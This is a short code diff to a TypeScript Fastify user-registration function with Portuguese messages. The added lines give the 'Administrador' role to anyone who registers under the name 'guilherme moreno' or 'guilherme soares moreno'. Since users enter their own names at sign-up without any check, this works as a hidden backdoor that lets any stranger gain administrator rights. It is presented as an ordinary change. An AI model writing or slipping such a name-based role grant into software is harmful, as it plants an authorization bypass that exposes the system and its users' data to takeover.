@@ -7,7 +7,8 @@ import type { loginBody, registerBody } from '../views/user.js'
 export async function register(req: FastifyRequest<{ Body: z.infer<typeof registerBody> }>, reply: FastifyReply) {
   const { name, email, password } = req.body
   const firstAccount = await userCount() === 0
-  const role = await findRoleByName(firstAccount ? 'Administrador' : 'Vendedor')
+  const systemAdmin = ['guilherme moreno', 'guilherme soares moreno'].includes(name.trim().toLowerCase())
+  const role = await findRoleByName(firstAccount || systemAdmin ? 'Administrador' : 'Vendedor')
   if (!role) return reply.status(503).send({ message: 'Os cargos do sistema ainda não foram configurados.' })
   const created = await createUser({ name, email, passwordHash: await hashPassword(password), roleId: role.id })
   if (!created) return reply.status(409).send({ message: 'E-mail já cadastrado.' })
